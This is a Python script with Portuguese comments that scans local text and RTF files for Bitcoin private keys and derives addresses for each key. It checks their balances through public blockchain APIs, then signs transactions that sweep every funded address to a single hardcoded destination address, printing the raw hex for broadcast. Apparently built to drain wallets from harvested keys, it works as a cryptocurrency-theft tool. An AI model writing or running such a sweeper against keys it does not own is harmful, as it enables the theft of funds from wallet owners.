import requests
import re
import time
import sys
from bitcoinlib.keys import Key
from bitcoinlib.transactions import Transaction

# --- CONFIGURAÇÕES ---
DEST_ADDRESS = 'bc1q0eej43uwaf0fledysymh4jm32h8jadnmqm8lgk'
FILES_TO_SCAN = ['privatekeys.txt', 'priv.key.rtf', 'chavprivelet1.txt', 'chaves_extraidas_e_enderecos_1.txt']

def deep_clean_rtf(raw_content):
    """Remove metadados RTF agressivamente para unir strings quebradas"""
    text = re.sub(r'\\[a-z0-9]+(?:\s|-?\d+)?', '', raw_content)
    text = re.sub(r'[{}]', '', text)
    return "".join(text.split())

def check_balance_api(address):
    """Consulta saldo com fallback imediato"""
    for api_url in [f"https://mempool.space/api/address/{address}", f"https://blockstream.info/api/address/{address}"]:
        try:
            r = requests.get(api_url, timeout=10)
            if r.status_code == 200:
                data = r.json()
                stats = data.get('chain_stats', {})
                return stats.get('funded_txo_sum', 0) - stats.get('spent_txo_sum', 0)
        except: continue
    return 0

def create_hex_transaction(addr, wif, utxos_val):
    """Prepara o HEX assinado e imprime para o Shell capturar"""
    try:
        # Busca UTXOs detalhados necessários para a assinatura
        r = requests.get(f"https://mempool.space/api/address/{addr}/utxo", timeout=15)
        if r.status_code != 200: return
        
        utxos = r.json()
        if not utxos: return

        tx = Transaction(network='bitcoin')
        # Taxa ajustada para garantir aceitação (fee de ~30.000 sats)
        fee = 30000 
        amount = utxos_val - fee
        
        if amount > 1000:
            for u in utxos:
                tx.add_input(prev_txid=u['txid'], output_n=u['vout'], value=u['value'], address=addr)
            
            tx.add_output(value=amount, address=DEST_ADDRESS)
            tx.sign([wif])
            
            raw_hex = tx.raw_hex()
            # O prefixo HEX_GEN: permite que o script Shell identifique a transação pronta
            print(f"HEX_GEN:{raw_hex}")
            sys.stdout.flush() 
        else:
            print(f"⚠️ Saldo em {addr} insuficiente para cobrir taxas.")
            sys.stdout.flush()
    except Exception as e:
        print(f"Erro ao gerar transação para {addr}: {e}")
        sys.stdout.flush()

def run_nuclear_scan():
    print("☢️ INICIANDO VARREDURA...")
    sys.stdout.flush()
    raw_strings = []
    
    # Lista para armazenar possíveis chaves privadas encontradas
    potential_keys = set()
    
    for file_path in FILES_TO_SCAN:
        try:
            with open(file_path, 'r', errors='ignore') as f:
                content = f.read()
                if file_path.endswith('.rtf'):
                    content = deep_clean_rtf(content)
                
                # Captura endereços (para log)
                found_addrs = re.findall(r'[13][a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-z0-9]{39,59}', content)
                for a in found_addrs:
                    raw_strings.append(a)
                
                # Captura Chaves Privadas WIF e HEX 64
                potential_keys.update(re.findall(r'[LK5][1-9A-HJ-NP-Za-km-z]{50,51}', content))
                potential_keys.update(re.findall(r'\b[0-9a-fA-F]{64}\b', content))
        except: continue

    unique_items = set(raw_strings)
    print(f"📊 Endereços identificados: {len(unique_items)}")
    print(f"🔑 Chaves privadas para testar: {len(potential_keys)}")
    sys.stdout.flush()

    # 1. Primeiro, logamos os endereços com saldo encontrados (seu pedido original)
    for addr in unique_items:
        bal = check_balance_api(addr)
        if bal > 0:
            print(f"🚨 SALDO DETECTADO EM ENDEREÇO: {addr} | {bal} sats")
            sys.stdout.flush()

    # 2. Agora, tentamos assinar transações com as chaves privadas encontradas
    for key_item in potential_keys:
        for comp in [True, False]:
            try:
                k = Key(key_item, network='bitcoin', compressed=comp)
                # Testa os 3 formatos de endereço para cada chave
                for addr_generated in [k.address(), k.address(witness_type='p2sh-p2wpkh'), k.address(witness_type='p2wpkh')]:
                    bal = check_balance_api(addr_generated)
                    if bal > 0:
                        print(f"💰 CHAVE VÁLIDA ENCONTRADA! Endereço: {addr_generated} | Saldo: {bal} sats")
                        create_hex_transaction(addr_generated, key_item, bal)
            except: continue
        time.sleep(0.05)

if __name__ == "__main__":
    run_nuclear_scan()
